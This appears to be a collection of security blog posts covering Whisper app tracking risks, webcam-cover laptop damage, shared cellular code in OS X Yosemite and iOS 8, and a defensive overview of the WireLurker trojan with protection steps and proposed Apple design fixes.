Tracking a unique identifier across the lifetime of an application could trivially be used by a company to build a history and profile for the subject, associating all of their former posts, photos, searches, and other stored data with a single identity. Any single message, then, containing identifying correspondence - or multiple messages containing different minor details that could be correlated to form an identity, will positively identify not only the user, but also correlate it to their entire history within the app. Further associating a GPS location to this data would, over the long term, easily provide enough information to determine the user's identity, simply by analyzing the overlaps of geo-coordinates over a time period. Even if Whisper were to sanitize GPS data to 1km of accuracy, the overlaps across time would likely allow a much smaller radius to be determined. Keep in mind that 100 meters, or even 500 meters, is often still well within the domain of a person's private property. Multiple data points distributed around that single location over a period of time can easily identify a person's home address.

In addition to the implications of Whisper themselves having the capability to abuse data on a user, malicious parties in privileged network positions could potentially also intercept the GPS data to gain specific information about the whereabouts, and correspondence of a user. A number of SSL vulnerabilities have been discovered and patched in recent time, and it is widely believed that many government bodies have the capability of attacking the secure socket layer. In these events, it is even more imperative that the application properly sanitize GPS lat/lon and other identifying data _prior to _sending to an upstream server.

**Conclusions**

Anonymous users have good reason to be concerned about their anonymity when using the Whisper application. While they may not have provided their name, the application has generated a unique identifier that can potentially be used to track them throughout the life of the application. When associated with unfiltered or overlapped global positioning data, their identities could be at risk.

  


About a year ago, I installed some of those little C-SLIDE plastic sliding webcam covers (from @WebcamCovers) on all of our laptops in the house (the kind that are now ubiquitous and private branded by everybody). This week, I had to take one of the laptops in for repair at Apple due to problems with the LCD. There were about a dozen horizontal lines at the top, and a small cone shaped black spot in the middle of the LCD directly underneath the iSight camera. The total repair was over $600 (talk about a markup).

In chatting with the Apple tech (I refuse to call them geniuses), he felt the most likely cause was a pressure crack inside the LCD. Given the machine was only a couple years old, and treated with care, we determined the most likely cause was the added pressure created by the little stick on sliding cov when you close the notebook. Even if you close it gently, the magnets create a pull on the top of the notebook screen. Additionally, even after it's closed, all of the pressure on the LCD, thanks to the camera cover, is now concentrated on the small area in the center of the notebook, instead of distributed across the entire panel. This means that even while its in your laptop case, any pressure on the lid is focused on one small area of the LCD. The plastic sliding camera covers are very convenient, however it looks as though over the long term, they have the potential to cause severe damage to your laptop screen, even if you care for your machines. I would advise avoiding them and look into solutions that do not interfere with the amount of pressure distributed across the LCD.

As it happens, @WebcamCovers admits that their own products cause damage "when pressure is applied", however what they don't tell you is that, even if you don't abuse your notebook, the "pressure" applied from normal use alone over a prolonged period of time, can cause damage to your notebook's LCD. In comparison, the little $5 piece of plastic is not worth the risk IMO for a $600 screen. EFF has some good alternatives on their website: stickers that can easily be peeled back and forth, and will re-adhere with no problems. If you care about causing damage to your laptop, I'd recommend looking at this alternative, or others, instead.

NOTE: @WebcamCovers has ignored my request to have the damage caused by their product reimbursed.

  


With Yosemite's release comes a lot of brand new code from Apple, and much to be explored. As you would expect, much of Yosemite's codebase is shared with iOS 8. With this includes cellular capabilities, which could make it very easy for Apple to support cellular data on the desktop platform. Yosemite does currently support hotspot tethering, but the overlap in codebase could also support something else in the future: MacBooks with integrated LTE functionality.

Apple's recent announcement of an "Apple SIM" went largely unnoticed, and while convenient for new iPad owners, is quite an undertaking for a product that has already saturated the market. On the other hand, you don't buy your laptops from Verizon or AT&T, nor would anyone want to buy a laptop that was tied to a particular cellular carrier. The Apple SIM makes much more sense if Apple's ultimate game is to release a MacBook Air with the ability to subscribe to any cellular network.

This morning, I decided to have a look into Apple's new download continuity manager (_nsurlsessiond_),which led me to also look at _networkd_, _findmydeviced_ and other daemons, on both Yosemite and iOS 8. Both codebases are virtually identical, with the cellular components simply compiled out of Yosemite's build. Here are some examples.

When I first delved into _nsurlsessiond, _I came across a few mentions of cellular connectivity, for example in this _connectionIsCellular_ instance variable.

![Screen Shot 2014-10-21 at 7.21.52 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-7.21.52-AM-1024x66.png)

> _This same instance variable exists, of course, in iOS 8's build of nsurlsessiond._

![Screen Shot 2014-10-21 at 10.09.27 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-10.09.27-AM-1024x47.png)

> _[Screen Shot 2014-10-21 at 10.09.27 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-10.09.27-AM.png)_

This is referenced when web content is being received, presumably to keep traffic statistics, logs, or similar other benign functionality.

![Screen Shot 2014-10-21 at 7.22.42 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-7.22.42-AM-1024x122.png)

> _[Screen Shot 2014-10-21 at 7.22.42 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-7.22.42-AM.png)_

Looking a little deeper into the daemon's connection status table, we see that Apple has integrated the capability to wait for non-cellular networks to become available, presumably depending on the user's data preferences. In other words, Yosemite has some of the same code as iOS to wait on downloads or other cellular data, when you have those preferences turned off.

![Screen Shot 2014-10-21 at 7.39.44 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-7.39.44-AM-1024x32.png)

> _[Screen Shot 2014-10-21 at 7.39.44 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-7.39.44-AM.png)_

The same is true of _networkd _between the two operating systems. The _networkd_ daemon handles a number of network-related functions, such as managing network policies, client connections, resource pools, etc. Peeking into _networkd_ gets interesting, we see a number of functions that are compiled out of the desktop build, so that they only return.

![Screen Shot 2014-10-21 at 8.01.04 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-8.01.04-AM-1024x86.png)

> _[Screen Shot 2014-10-21 at 8.01.04 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-8.01.04-AM.png)_

![Screen Shot 2014-10-21 at 8.03.21 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-8.03.21-AM-1024x83.png)

> _The mobile build, however, includes the code for these functions._

![Screen Shot 2014-10-21 at 10.16.44 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-10.16.44-AM-1024x263.png)

> _[Screen Shot 2014-10-21 at 10.16.44 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-10.16.44-AM.png)_

![Screen Shot 2014-10-21 at 10.17.39 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-10.17.39-AM-1024x388.png)

> _[Screen Shot 2014-10-21 at 10.17.39 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-10.17.39-AM.png)_

These two empty functions are used to determine application-level cellular data access, which is a capability of iOS. So what's going on here? It's simple. In a shared codebase, you have different switches to turn on certain features. The Yosemite build presently has these features turned off, where the iOS build is on. Apple's code likely looks something like this:
    
    
    -(bool)dataBlockedForBundle:(NSString *)bundleID {
    
    #ifdef TARGET_OS_IPHONE
    
        /* cellular code here */
    
    #else
    
        return 0;
    
    #endif
    
    }

You can see the same thing in _networkd_'s use of cellular entitlements.

![Screen Shot 2014-10-21 at 8.19.26 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-8.19.26-AM-1024x281.png)

> _[Screen Shot 2014-10-21 at 8.19.26 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-8.19.26-AM.png)_

Here, this entitlement is unused in Yosemite because _SUB_100010E1C_, just like most other subroutines related to cellular data, are ifdef'd out with a precompiler directive, so that they simply return 0.

![Screen Shot 2014-10-21 at 8.13.42 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-8.13.42-AM-1024x51.png)

> _[Screen Shot 2014-10-21 at 8.13.42 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-21-at-8.13.42-AM.png)_

The startCellular method in networkd is particularly interesting, as it has a significant amount of program logic that hasn't been removed (if/then/else statements), but most of its core functionality calls out to more empty functions that simply return 0. In other words, the code is there to start a cellular connection, but when it actually invokes functions to do so, they simply return in the Yosemite build, where they would actually do something in the iOS build.

**Conclusion**

Yosemite and iOS use a shared codebase for much of their networking. This, alone, doesn't mean that Apple is planning LTE-enabled laptops or other types of inventions in the future. Shared codebases can be much easier to manage in some cases, and there are a number of good development decisions that support doing this. In light of Apple's research into a unified "Apple SIM", it does raise some interesting speculation though. With a shared codebase, Apple is already in a position to support cellular in Yosemite, by simply compiling those features into the operating system. With a carrier-independent SIM, Apple would be perfectly positioned to deliver an LTE-capable MacBook Air or other similar device. Perhaps instead of a MacBook, this 12″ tablet everyone's speculating about will actually run Yosemite.

Apple was smart in their design, and this gave them the flexibility to incorporate much of the same functionality from iOS into Yosemite, if they so choose. Apple is heading down the road of wireless mobility in all things, and their next suite of products are bound to further push the envelope for connectivity. Given their strong push for iCloud and interoperability, it would only make sense for the Apple SIM to make an appearance in some desktop devices at some point in the future. I personally would love to see this.

  


Mobile Security company Palo Alto Networks has released a new white paper titled [WireLurker: A New Era in iOS and OS X Malware](https://www.paloaltonetworks.com/content/dam/paloaltonetworks-com/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf). I've gone through their findings, and also managed to get a hold of the WireLurker malware to examine it first-hand (thanks to Claud Xiao from Palo Alto Networks, who sent them to me). Here's the quick and dirty about WireLurker; what you need to know, what it does, what it doesn't do, and how to protect yourself.

**How it Works**

WireLurker is a trojan that has reportedly been circulated in a number of Chinese pirated software (warez) distributions. It targets 64-bit Mac OS X machines, as there doesn't appear to be a 32-bit slice. When the user installs or runs the pirated software, WireLurker waits until it has root, and then gets installed into the operating system as a system daemon. The daemon uses [libimobiledevice](http://www.libimobiledevice.org). It sits and waits for an iOS device to be connected to the desktop, and then abuses the trusted pairing relationship your desktop has with it to read its serial number, phone number, iTunes store identifier, and other identifying information, which it then sends to a remote server. It also attempts to install malicious copies of otherwise benign looking apps onto the device itself. If the device is jailbroken and has _afc2_ enabled, a much more malicious piece of software gets installed onto the device, which reads and extracts identifying information from your iMessage history, address book, and other files on the device.

WireLurker appears to be most concerned with identifying the device owners, rather than stealing a significant amount of content or performing destructive actions on the device. In other words, WireLurker seems to be targeting the identities of Chinese software pirates.

**Practical Steps**

Palo Alto Networks has [released a WireLurker detector](https://github.com/PaloAltoNetworks-BD/WireLurkerDetector) to determine if WireLurker is on your Mac desktop.

WireLurker uses enterprise provisioning to install software on non-jailbroken iOS devices, but this is only one piece of it. Apple can revoke the enterprise certificate to prevent installation on iOS 8 devices, however WireLurker can still read information from the device without it. This is because the information is queried by the Mac desktop when your iPhone is plugged into it, by abusing that trusted relationship. Also, if you have a jailbroken iPhone running afc2 (a terribly insecure service allowing root file system access to the device), then a mobile substrate library is copied onto the device to infect the system. This is done regardless of whether or not WireLurker still has a valid enterprise profile.

Much of the content is downloaded over the network, so it's conceivable that if Apple revokes one certificate, additional certificates could be substituted and new copies of the software inserted.

Practical steps the user can take are to ensure that your device is not running afc2 (and subsequently, not jailbroken, as this weakens your device's overall security), run Palo Alto Networks' WireLurker Detector, and also install Little Snitch on your desktop so that you can identify any rogue outgoing connections. If you suspect you may have a malicious application installed by WireLurker on your iOS device, you can also look for an enterprise provisioning profile in Settings > General > Profiles. Of course, it's also a good idea not to install pirated software, which WireLurker appears to travel with. Once installed on your device, it's much more difficult to identify or control. The mobile substrate library used to infect jailbroken devices is copied to _/var/mobile/Library/MobileSubstrate/DynamicLibraries/sfbase.dylib_ on the device (or similar).

While your own Mac may not be infected with WireLurker, it's possible others (in your school, college, at work, or public computers) are, so it's important not to trust any devices other than your own. To help prevent this from accidentally happening, you may wish to pair lock your device [using these instructions](http://www.zdziarski.com/blog/?p=2589).

**Implications**

The bigger issue here is not WireLurker itself; WireLurker appears to be in its infancy, and is mostly a collection of scripts, property lists, and binaries all duct-taped together on the desktop, making it easy to detect. The real issue is that the design of iOS' pairing mechanism allows for more sophisticated variants of this approach to easily be weaponized. I've previously written about how non-jailbroken devices can be [infected with modified binaries](http://www.zdziarski.com/blog/?p=4002), due to Apple's lack of codesign pinning. I've also discussed at length about how malicious software can [abuse the pairing records of a desktop machine](http://www.zdziarski.com/blog/wp-content/uploads/2014/08/Zdziarski-iOS-DI-2014.pdf) to install malware on an iOS device. While WireLurker appears fairly amateur, an NSA or a GCHQ, or any other sophisticated attacker could easily incorporate a much more effective (and dangerous) attack like this.

**A Call for Design Changes**

What can Apple do to help prevent it? have a number of ideas ranging from easy fixes to difficult design changes.

On the easy side:

1\. Have the phones do a better job of prompting the user before installing applications.

User education is the biggest problem, and Apple has a poor reputation for helping their users make smarter decisions about security. Apps that aren't signed by Apple (e.g. enterprise apps) only provide a simple OK prompt, and don't warn the user that the app is not signed / authorized by the App Store. A more thorough explanation to the user about what they are about to click OK to will likely help prevent a number of users from allowing the software to install on iOS in the first place.

2\. Disable "Enterprise" app installation entirely without an "Enterprise Mode"

A vast majority of non-enterprise users will never need a single enterprise app installed, and any attempt to do so should fail. So why doesn't Apple lock this capability out unless it's explicitly enabled? This could look like a switch in settings, or even just prompting the user so that they understand they're accepting applications that are not sanctioned by the app store. Again, there is a user education component here, but also just like a "developer mode", it would make sense for non-supervised devices to have an "enterprise mode" or "ad-hoc mode" that has to be explicitly enabled before any third party software can be installed.

3\. Access Controls and/or Encryption for Pair Records

I stated this in my iOS Backdoors / Attack Points paper (<http://www.zdziarski.com/blog/wp-content/uploads/2014/08/Zdziarski-iOS-DI-2014.pdf>) as a point of attack: pairing records are not protected in any way on the desktop, and are world-readable. Any application on a user's desktop can access the pairing record and have completely trusted privileges with any iOS devices either connected directly by USB, or also via WiFi. Thankfully, [Apple finally closed off](http://www.zdziarski.com/blog/?p=3820) a number of ways to dump data wirelessly from iOS 8, however the desktop threats demonstrated with WireLurker still exist.

Apple should manage access to "Trusted Pairing Relationships" with devices the same way it manages access permissions for contacts and geolocation. An application should have to ask for permission to access this privileged data. This would allow iTunes and Xcode to use it, but not others. This can be done with a broker daemon, encryption, and the keychain. If the pair records were encrypted with a key stored in the keychain (or better yet, with the user's backup password), then even applications obtaining root access would still need the user's authorization.

Alternatively, this could be managed in a way that locks out any third party application from piggybacking on these trusted relationships. The pair record could be encrypted with a unique key created by iTunes / Xcode, and stored on the keychain. This would prevent third party tools like libimobiledevice from being able to access content on the device at all (at least without having to go to the device directly to pair, which would alert the user with another trust dialog). This, too, could even be managed with a port lock.

More difficult side:

1\. While WireLurker actually changed the bundle identifier for their iOS-side malware, the wildcard stayed the same. A better version of this attack would use the same identifier as the existing apps; I've demonstrated this in the article mentioned earlier on my website, explaining how app store apps are being hacked on non-jb phones. Apple currently has no mechanism to pin a bundle id (e.g. com.facebook.*) to a specific developer cert. This means that anyone can delete the signature from an app, modify the app's binary, then re-sign it with their own certificate, and it'll run on the phone as if it were the original application, complete with APNS, upgrade support, access to all files and configuration data in the sandbox, and so on. Apple could add codesign pinning to developer certs by including bundle wildcards or identifiers in the cert, then enforce this in the OS, forcing it to match the bundle identifier of the app. This would pin the bundle identifier so that it has to be signed with a specific entity's cert in order to match. Applications, too, can be coded in such a way to transmit the bundle identifier to the server, so that the server can match it, to provide some (but not complete) additional security.

2\. In addition to codesign pinning, Apple could come up with a mechanism (perhaps through entitlements) to have the operating system enforce access to specific hostnames only by specific bundle identifiers. For example, allowing privateapi.facebook.com network access only to bundle identifiers com.facebook.messenger, or what have you. This wouldn't directly affect siphoning data off to remote servers, but it would cause masquerading applications to suspiciously fail to connect to protected hosts.

3\. Using the secure element in iOS devices to validate applications. I wrote about this already here: <http://www.zdziarski.com/blog/?p=4002>

There are many other ideas rolling around in my head, but those are the first that come to mind.

**Conclusion**

It would greatly behoove Apple to address this situation with more than a certificate revocation; I'm not scared of WireLurker, but I am concerned that this technique could be weaponized in the future, and be a viable means of attack on public and private sector machines. It could easily be attached to any software download in-transit across non-encrypted HTTP, such as an Adobe Flash download or other software download. Social engineering would also help to make juicy targets out of people likely to click on links from IT departments or install software on their Mac. There are a number of potentially more dangerous uses for WireLurker, and unfortunately many of them will go unnoticed by Apple in time to revoke a certificate. It would be a much better solution to address the underlying design issues that make this possible.
